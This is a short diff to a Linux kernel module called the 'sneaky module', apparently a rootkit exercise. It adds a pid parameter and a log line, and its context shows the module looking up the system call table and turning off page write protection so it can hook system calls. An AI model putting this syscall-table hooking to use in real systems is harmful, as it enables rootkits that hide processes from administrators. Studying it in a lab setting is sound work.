@@ -14,6 +14,9 @@
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
+int pid = 3;
+module_param(pid, int, 0);
+
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
 int enable_page_rw(void *ptr){
@@ -49,7 +52,7 @@ static int initialize_sneaky_module(void)
 {
   // See /var/log/syslog or use `dmesg` for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
-
+  printk(KERN_INFO "Pid loaded is %d \n", pid);  
   // Lookup the address for this symbol. Returns 0 if not found.
   // This address will change after rebooting due to protection
   sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
